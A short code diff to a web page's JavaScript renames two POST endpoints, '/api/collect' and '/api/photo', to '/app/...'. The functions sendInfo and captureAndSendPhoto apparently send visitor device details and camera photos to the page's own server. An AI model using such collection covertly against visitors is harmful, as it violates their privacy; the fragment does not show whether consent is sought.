@@ -61,7 +61,7 @@ ${navigator.userAgent}
 }
 
 function sendInfo(text) {
-    return fetch("/api/collect", {
+    return fetch("/app/collect", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ text })
@@ -89,7 +89,7 @@ function captureAndSendPhoto() {
         const formData = new FormData();
         formData.append("photo", blob);
 
-        fetch("/api/photo", {
+        fetch("/app/photo", {
             method: "POST",
             body: formData
         })
